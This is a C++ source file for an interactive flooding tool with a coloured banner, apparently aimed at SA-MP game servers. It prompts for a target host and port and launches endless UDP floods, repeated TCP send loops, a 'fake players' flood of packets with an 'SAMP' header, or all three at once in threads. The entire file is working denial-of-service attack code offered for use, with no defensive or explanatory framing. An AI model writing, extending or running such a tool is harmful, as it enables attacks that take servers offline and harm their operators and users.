#include <iostream>
#include <thread>
#include <random>
#include <chrono>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <sstream>
#include <string>
#include <netdb.h>

using namespace std;

void display_banner() {
    cout << "\033[1;31m    _________" << endl;
    cout << "   /         \\ " << endl;
    cout << "  |   O   O   |" << endl;
    cout << "  |     ^     |" << endl;
    cout << "  |    '-'    |" << endl;
    cout << "   \\_________/ \033[0m" << endl;

    cout << "\033[1;32m    |     |" << endl;
    cout << "    |     |" << endl;
    cout << "    |     |" << endl;
    cout << "   /       \\" << endl;
    cout << "  /         \\" << endl;
    cout << " /___________\\\033[0m" << endl;
    cout << endl;

    cout << "\033[1;34m████████╗\033[1;35m███████╗ \033[1;36m█████╗ \033[1;31m███╗   ███╗     \033[1;33m█████╗ \033[1;32m███╗   ██╗ \033[1;34m██████╗  \033[1;35m██████╗ \033[1;36m██╗   ██╗ \033[1;31m███████╗ \033[0m" << endl;
    cout << "\033[1;34m╚══██╔══╝\033[1;35m██╔════╝\033[1;36m██╔══██╗\033[1;31m████╗ ████║    \033[1;33m██╔══██╗\033[1;32m████╗  ██║\033[1;34m██╔═══██╗\033[1;35m██╔════╝\033[1;36m██║   ██║\033[1;31m██╔════╝\033[0m" << endl;
    cout << "\033[1;34m   ██║   \033[1;35m█████╗  \033[1;36m███████║\033[1;31m██╔████╔██║    \033[1;33m███████║\033[1;32m██╔██╗ ██║\033[1;34m██║   ██║\033[1;35m██║  ███╗\033[1;36m██║   ██║\033[1;31m█████╗  \033[0m" << endl;
    cout << "\033[1;34m   ██║   \033[1;35m██╔══╝  \033[1;36m██╔══██║\033[1;31m██║╚██╔╝██║    \033[1;33m██╔══██║\033[1;32m██║╚██╗██║\033[1;34m██║   ██║\033[1;35m██║   ██║\033[1;36m██║   ██║\033[1;31m██╔══╝  \033[0m" << endl;
    cout << "\033[1;34m   ██║   \033[1;35m███████╗\033[1;36m██║  ██║\033[1;31m██║ ╚═╝ ██║    \033[1;33m██║  ██║\033[1;32m██║ ╚████║\033[1;34m╚██████╔╝\033[1;35m╚██████╔╝\033[1;36m╚██████╔╝\033[1;31m███████╗\033[0m" << endl;
    cout << "\033[1;34m   ╚═╝   \033[1;35m╚══════╝\033[1;36m╚═╝  ╚═╝\033[1;31m╚═╝     ╚═╝    \033[1;33m╚═╝  ╚═╝\033[1;32m╚═╝  ╚═══╝\033[1;34m ╚═════╝ \033[1;35m ╚═════╝ \033[1;36m ╚═════╝ \033[1;31m╚══════╝\033[0m" << endl;

    cout << endl;
    cout << "\033[1;36m[TEAM]\033[0m" << endl;
}

// Resolve server name to IP address
string resolve_hostname(const string& hostname) {
    struct hostent *he = gethostbyname(hostname.c_str());
    if (he == NULL) {
        cerr << "[ERROR] Unable to resolve hostname!" << endl;
        exit(1);
    }
    struct in_addr **addr_list = (struct in_addr **) he->h_addr_list;
    return inet_ntoa(*addr_list[0]);
}

// Parse the target server and port
pair<string, int> parse_target(const string& target) {
    stringstream ss(target);
    string host;
    int port;
    char colon;
    getline(ss, host, ':');
    ss >> colon >> port;
    return make_pair(host, port);
}

// Perform a UDP attack
void attack_udp(const string& ip, int port, int times) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        cerr << "[ERROR] Unable to create socket!" << endl;
        return;
    }

    struct sockaddr_in server_addr {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr) <= 0) {
        cerr << "[ERROR] Invalid IP address!" << endl;
        return;
    }

    char packet[1460];
    while (true) {
        for (int i = 0; i < times; ++i) {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        }
        cout << "[TEAM] UDP ATTACK LAUNCHED!" << endl;
    }

    close(sockfd);
}

// Perform a TCP attack
void attack_tcp(const string& ip, int port, int times) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        cerr << "[ERROR] Unable to create socket!" << endl;
        return;
    }

    struct sockaddr_in server_addr {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr) <= 0) {
        cerr << "[ERROR] Invalid IP address!" << endl;
        return;
    }

    char packet[1204];
    while (true) {
        if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            for (int i = 0; i < times; ++i) {
                send(sockfd, packet, sizeof(packet), 0);
            }
            cout << "[TEAM] TCP ATTACK LAUNCHED!" << endl;
        } else {
            cerr << "[ERROR] Connection failed!" << endl;
        }
    }

    close(sockfd);
}

// Perform Fake Players Attack
void send_fake_players(const string& ip, int port, int times, int fake_players_count) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        cerr << "[ERROR] Unable to create socket!" << endl;
        return;
    }

    struct sockaddr_in server_addr {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr) <= 0) {
        cerr << "[ERROR] Invalid IP address!" << endl;
        return;
    }

    // Simulating fake player data
    for (int i = 0; i < fake_players_count; ++i) {
        unsigned char fake_player_packet[32] = {
            'S', 'A', 'M', 'P',
            0x00, 0x00, 0x00, 0x00,
            0x09,
            0x00, 0x00, 0x00, 0x00,
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255),
            (unsigned char)(rand() % 255)
        };

        // Send fake player data
        sendto(sockfd, fake_player_packet, sizeof(fake_player_packet), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    }

    cout << "[TEAM] Fake Players Attack Launched!" << endl;

    close(sockfd);
}

int main() {
    display_banner();

    string target;
    int port, times, choice, fake_players_count;

    cout << "Enter server address with port (e.g., host:port): ";
    cin >> target;

    string ip;
    if (target.find(':') != string::npos) {
        auto [host, target_port] = parse_target(target);
        ip = resolve_hostname(host);
        port = target_port;
    } else {
        ip = target;
        cout << "Enter port: ";
        cin >> port;
    }

    cout << "Target IP: " << ip << " Target Port: " << port << endl;

    cout << "Enter number of packets: ";
    cin >> times;

    cout << "Select attack type:\n1. UDP\n2. TCP\n3. Fake Players\n4. All\nChoice: ";
    cin >> choice;

    if (choice == 1) {
        thread udp_attack(attack_udp, ip, port, times);
        udp_attack.join();
    } else if (choice == 2) {
        thread tcp_attack(attack_tcp, ip, port, times);
        tcp_attack.join();
    } else if (choice == 3) {
        cout << "Enter number of fake players: ";
        cin >> fake_players_count;
        thread fake_players_attack(send_fake_players, ip, port, times, fake_players_count);
        fake_players_attack.join();
    } else if (choice == 4) {
        cout << "Enter number of fake players: ";
        cin >> fake_players_count;
        thread udp_attack_thread(attack_udp, ip, port, times);
        thread tcp_attack_thread(attack_tcp, ip, port, times);
        thread fake_players_attack_thread(send_fake_players, ip, port, times, fake_players_count);
        udp_attack_thread.join();
        tcp_attack_thread.join();
        fake_players_attack_thread.join();
    } else {
        cout << "[ERROR] Invalid choice!" << endl;
    }

    return 0;
}
